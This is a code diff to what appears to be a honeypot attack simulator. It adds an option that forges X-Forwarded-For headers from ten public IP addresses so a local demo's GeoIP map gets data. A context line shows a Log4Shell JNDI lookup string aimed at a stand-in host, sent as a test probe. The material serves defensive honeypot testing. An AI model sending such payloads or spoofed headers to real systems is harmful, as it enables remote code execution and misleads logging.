@@ -8,6 +8,11 @@ Usage (from the backend directory, or inside the backend container):
     python -m sim.simulate                      # 10 SSH attacks + HTTP probes
     python -m sim.simulate --count 25 --delay 0.1
     python -m sim.simulate --skip-http --no-check
+    python -m sim.simulate --spoof-sources          # HTTP probes appear to come from 10 countries
+
+--spoof-sources sends each HTTP probe once from every address in SPOOF_SOURCES,
+using the X-Forwarded-For header, so the world map and GeoIP panels have data in a
+local demo. SSH attacks always come from the real connection address (127.0.0.1).
 
 After the run it asks the API which MITRE ATT&CK techniques were recorded
 for the new events and prints the counts (use --no-check to skip).
@@ -53,6 +58,38 @@ HTTP_PROBES: tuple[tuple[str, str, dict[str, str] | None, str], ...] = (
     ("GET", "/", None, "${jndi:ldap://evil.example/a}"),                               # T1190 (Log4Shell)
 )
 
+# Public addresses of well-known DNS resolvers, registries and CDNs, one or two per continent.
+# Used only as the claimed X-Forwarded-For source of demo probes; no traffic is sent to them.
+SPOOF_SOURCES: tuple[str, ...] = (
+    "8.8.8.8",          # Google DNS, United States
+    "185.199.108.153",  # GitHub Pages (Fastly), United States
+    "13.248.169.48",    # Amazon, Canada
+    "200.160.2.3",      # NIC.br, Brazil
+    "77.88.8.8",        # Yandex DNS, Russia
+    "9.9.9.9",          # Quad9 DNS, Switzerland
+    "196.216.2.1",      # AFRINIC, South Africa
+    "114.114.114.114",  # 114DNS, China
+    "202.12.27.33",     # WIDE Project, Japan
+    "1.1.1.1",          # Cloudflare DNS, Australia
+)
+
+
+def probe_plan(spoof_sources: bool) -> list[tuple[str | None, tuple[str, str, dict[str, str] | None, str]]]:
+    """Return (claimed source address or None, probe) pairs in the order they are sent.
+
+    Without spoofing, every probe is sent once from the real address. With spoofing,
+    the whole probe set is sent once per address in SPOOF_SOURCES.
+    """
+    sources: tuple[str | None, ...] = SPOOF_SOURCES if spoof_sources else (None,)
+    return [(source, probe) for source in sources for probe in HTTP_PROBES]
+
+
+def probe_headers(agent: str, source: str | None) -> dict[str, str]:
+    headers = {"User-Agent": agent}
+    if source is not None:
+        headers["X-Forwarded-For"] = source
+    return headers
+
 
 def build_attack(number: int) -> AttackSpec:
     """Return the spec for attack *number* (1-based).
@@ -77,6 +114,9 @@ def make_parser() -> argparse.ArgumentParser:
     parser.add_argument("--http-port", type=int, default=8081, help="HTTP honeypot port (default 8081)")
     parser.add_argument("--api", default="http://127.0.0.1:8090", help="API base URL used for the summary")
     parser.add_argument("--skip-http", action="store_true", help="send SSH attacks only")
+    parser.add_argument("--spoof-sources", action="store_true",
+                        help=f"send the HTTP probes from {len(SPOOF_SOURCES)} public addresses via X-Forwarded-For, "
+                             "so the map has geolocated sources (SSH is not affected)")
     parser.add_argument("--no-check", action="store_true", help="do not query the API after the run")
     parser.add_argument("--verbose", "-v", action="store_true", help="debug logging")
     return parser
@@ -95,17 +135,17 @@ async def _ssh_attack(spec: AttackSpec, host: str, port: int) -> int:
     return len(spec.commands)
 
 
-async def _http_probes(host: str, port: int) -> int:
+async def _http_probes(host: str, port: int, spoof_sources: bool = False) -> int:
     import aiohttp
 
     sent = 0
     timeout = aiohttp.ClientTimeout(total=10)
     async with aiohttp.ClientSession(timeout=timeout) as session:
-        for method, path, data, agent in HTTP_PROBES:
+        for source, (method, path, data, agent) in probe_plan(spoof_sources):
             url = f"http://{host}:{port}{path}"
-            async with session.request(method, url, data=data, headers={"User-Agent": agent}) as response:
+            async with session.request(method, url, data=data, headers=probe_headers(agent, source)) as response:
                 await response.read()
-                logger.debug("%s %s -> %s", method, path, response.status)
+                logger.debug("%s %s from %s -> %s", method, path, source or "real address", response.status)
                 sent += 1
     return sent
 
@@ -140,13 +180,15 @@ async def run(args: argparse.Namespace) -> int:
     probes = 0
     if not args.skip_http:
         try:
-            probes = await _http_probes(args.host, args.http_port)
+            probes = await _http_probes(args.host, args.http_port, args.spoof_sources)
         except Exception as error:
             http_failures += 1
             logger.warning("HTTP probes failed: %s", error)
 
+    planned = 0 if args.skip_http else len(probe_plan(args.spoof_sources))
+    spoofed = f" from {len(SPOOF_SOURCES)} spoofed public addresses" if args.spoof_sources and not args.skip_http else ""
     print(f"Sent {args.count - ssh_failures} of {args.count} SSH attacks ({commands} commands) "
-          f"and {probes} of {0 if args.skip_http else len(HTTP_PROBES)} HTTP probes.")
+          f"and {probes} of {planned} HTTP probes{spoofed}.")
 
     if not args.no_check:
         await asyncio.sleep(1.0)  # let the enrichment pipeline store the last events
